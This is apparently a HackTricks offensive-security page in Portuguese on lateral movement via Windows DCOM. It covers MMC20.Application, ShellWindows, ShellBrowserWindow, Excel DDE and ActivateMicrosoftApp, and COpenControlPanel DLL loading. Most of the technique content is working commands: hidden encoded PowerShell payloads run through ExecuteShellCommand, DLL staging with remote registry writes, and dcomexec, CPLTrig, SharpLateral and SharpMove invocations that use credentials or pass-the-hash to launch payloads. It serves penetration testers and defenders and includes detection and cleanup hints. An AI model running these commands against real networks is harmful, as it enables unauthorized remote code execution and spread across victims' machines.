# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

O movimento lateral via DCOM é atraente porque reutiliza servidores COM existentes expostos por RPC/DCOM, em vez de criar um serviço ou uma tarefa agendada. Na prática, isso significa que a conexão inicial geralmente começa na TCP/135 e depois passa para portas RPC altas atribuídas dinamicamente.

## Pré-requisitos e ressalvas

- Geralmente, é necessário ter contexto de administrador local no alvo, e o servidor COM remoto deve permitir inicialização/ativação remota.
- Desde **14 de março de 2023**, a Microsoft aplica o hardening do DCOM nos sistemas com suporte. Clientes antigos que solicitam um nível baixo de autenticação de ativação podem falhar, a menos que negociem pelo menos `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Clientes Windows modernos geralmente elevam esse nível automaticamente, então as ferramentas atuais normalmente continuam funcionando.<sup>[[3]](#references)</sup>
- A execução manual ou por script via DCOM geralmente requer TCP/135 e o intervalo de portas RPC dinâmicas do alvo. Se estiver usando o `dcomexec.py` do Impacket e quiser receber a saída dos comandos, geralmente também precisará de acesso SMB ao `ADMIN$` (ou a outro compartilhamento com permissão de leitura e gravação).
- Se RPC/DCOM funcionar, mas SMB estiver bloqueado, `dcomexec.py -nooutput` ainda pode ser útil para execução às cegas.

Verificações rápidas:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Para obter mais informações sobre essa técnica, consulte a [publicação original sobre MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Os objetos Distributed Component Object Model (DCOM) oferecem recursos interessantes para interações com objetos pela rede. A Microsoft fornece documentação abrangente sobre DCOM e Component Object Model (COM), disponível [aqui para DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [aqui para COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). É possível obter uma lista de aplicativos DCOM usando o comando do PowerShell:

```bash
Get-CimInstance Win32_DCOMApplication
```

O objeto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite criar scripts para operações de snap-ins do MMC. Vale destacar que esse objeto contém um método `ExecuteShellCommand` em `Document.ActiveView`. Mais informações sobre esse método podem ser encontradas [aqui](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Confira sua execução:<sup>[[6]](#references)</sup>

Esse recurso facilita a execução de comandos pela rede por meio de um aplicativo DCOM. Para interagir remotamente com o DCOM como admin, é possível usar o PowerShell da seguinte forma:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Este comando conecta-se à aplicação DCOM e retorna uma instância do objeto COM. Em seguida, o método ExecuteShellCommand pode ser invocado para executar um processo no host remoto. O processo envolve as seguintes etapas:

Verificar métodos:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Obter RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

O último argumento é o estilo da janela. `7` mantém a janela minimizada. Em termos operacionais, a execução baseada em MMC geralmente faz com que um processo remoto `mmc.exe` inicie seu payload, o que difere dos objetos associados ao Explorer abaixo.

## ShellWindows & ShellBrowserWindow

**Para mais informações sobre essa técnica, confira a publicação original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

O objeto **MMC20.Application** foi observado sem um valor `LaunchPermission` específico do aplicativo.<sup>[[2]](#references)</sup> Isso, por si só, não concede acesso: o COM verifica a ACL `DefaultLaunchPermission` da máquina e as restrições de inicialização/acesso aplicáveis a toda a máquina.<sup>[[9]](#references)[[10]](#references)</sup> Para mais detalhes, consulte esta discussão [aqui](https://twitter.com/tiraniddo/status/817532039771525120). Também é recomendável usar o OleView .NET de [@tiraniddo](https://twitter.com/tiraniddo) para filtrar objetos sem uma Launch Permission explícita.

Dois objetos específicos, `ShellBrowserWindow` e `ShellWindows`, foram destacados por não terem Launch Permissions explícitas.<sup>[[2]](#references)</sup> A ausência de um valor `LaunchPermission` em `HKCR:\AppID\{guid}` significa que não há uma ACL de inicialização específica do aplicativo; **não** significa que a ativação remota não tenha restrições.<sup>[[9]](#references)[[10]](#references)</sup>

Em comparação com `MMC20.Application`, esses objetos costumam ser mais discretos do ponto de vista de OPSEC, pois o comando geralmente acaba sendo um processo filho de `explorer.exe` no host remoto, em vez de `mmc.exe`.

### ShellWindows

Para `ShellWindows`, que não tem um ProgID, os métodos .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` permitem instanciar o objeto usando seu CLSID. Esse processo usa o OleView .NET para obter o CLSID de `ShellWindows`. Depois de instanciado, é possível interagir com o objeto por meio do método `WindowsShell.Item`, o que permite invocar métodos como `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Foram fornecidos comandos de exemplo do PowerShell para instanciar o objeto e executar comandos remotamente:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` é semelhante, mas você pode instanciá-lo diretamente por meio do seu CLSID e fazer pivot para `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Lateral Movement com objetos DCOM do Excel

É possível realizar lateral movement explorando objetos DCOM do Excel. Para obter informações detalhadas, recomenda-se ler a discussão sobre como aproveitar o Excel DDE para lateral movement via DCOM no [blog da Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

O projeto Empire fornece um script PowerShell que demonstra como usar o Excel para execução remota de código (RCE) manipulando objetos DCOM. Abaixo estão trechos do script disponível no [repositório GitHub do Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), que mostram diferentes métodos para abusar do Excel para RCE:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Pesquisas recentes ampliaram essa área com o método `ActivateMicrosoftApp()` de `Excel.Application`. A ideia principal é que o Excel pode tentar iniciar aplicativos Microsoft legados, como FoxPro, Schedule Plus ou Project, pesquisando no `PATH` do sistema. Se um operador puder colocar um payload com um desses nomes esperados em um local gravável que faça parte do `PATH` do alvo, o Excel o executará.<sup>[[4]](#references)</sup>

Requisitos para essa variação:

- Administrador local no alvo
- Excel instalado no alvo
- Capacidade de gravar um payload em um diretório gravável no `PATH` do alvo

Exemplo prático abusando da busca do FoxPro (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Se o host atacante não tiver o ProgID local `Excel.Application` registrado, instancie o objeto remoto usando o CLSID:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Valores vistos sendo usados indevidamente na prática:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — carregamento de uma DLL registrada do Control Panel

A classe `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) expõe `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Seu método `Open()` faz com que DLLs do Control Panel registradas sob a chave `Control Panel\Cpls` sejam carregadas por um `dllhost.exe` remoto. A classe não tem permissões explícitas de inicialização/acesso nos sistemas testados, portanto herda a política DCOM padrão (que normalmente exige um administrador para ativação remota). Um nome de item aleatório basta para fazer com que `Open()` processe as DLLs registradas; o payload não precisa ter a extensão `.cpl`, embora precise ser uma DLL válida da arquitetura correta.<sup>[[7]](#references)</sup>

Essa primitiva usa **stage-and-trigger**, não apenas a execução de comandos: primeiro, copie uma DLL para o alvo e crie um valor `REG_EXPAND_SZ` que aponte para ela; em seguida, ative o objeto via DCOM. Por exemplo, em um contexto administrativo do Windows:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

O client público [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) implementa a chamada DCOM não documentada com Impacket. Basta fornecer um nome arbitrário de item do Painel de Controle; o client pode reportar um erro RPC mesmo que `dllhost.exe` tenha carregado a DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Operacionalmente, esse caminho também exige um canal de gravação de arquivos e acesso remoto ao registro, por isso gera mais ruído do que `MMC20`/`ShellWindows`. Ele cria um efeito colateral de persistência, pois abrir o Painel de Controle posteriormente pode carregar a mesma entrada novamente. Remova o valor após a execução e procure valores inesperados em `Control Panel\Cpls` junto com carregamentos incomuns de DLL em `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Automation Tools for Lateral Movement

Duas ferramentas são destacadas para automatizar essas técnicas:

- **Invoke-DCOM.ps1**: Um script PowerShell fornecido pelo projeto Empire que simplifica a invocação de diferentes métodos para executar código em máquinas remotas. Esse script está disponível no repositório do Empire no GitHub.

- **SharpLateral**: Uma ferramenta projetada para executar código remotamente, que pode ser usada com o comando:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Ferramentas automáticas

- O script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permite invocar facilmente todas as formas comentadas de executar código em outras máquinas.
- Você pode usar o `dcomexec.py` do Impacket para executar comandos em sistemas remotos usando DCOM. As versões atuais oferecem suporte a `ShellWindows`, `ShellBrowserWindow` e `MMC20`, e usam `ShellWindows` por padrão.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Você também poderia usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Você também pode usar [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Movimentação lateral usando o objeto COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Movimentação lateral via DCOM: rodada 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 — Gerenciar alterações para o bypass do recurso de segurança do Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Movimentação lateral: aproveite o poder do aplicativo DCOM Excel](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Usando Excel DDE para movimentação lateral via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Classe do aplicativo MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Usando objetos DCOM para execução remota de comandos](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Apêndice B, comportamento do produto - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
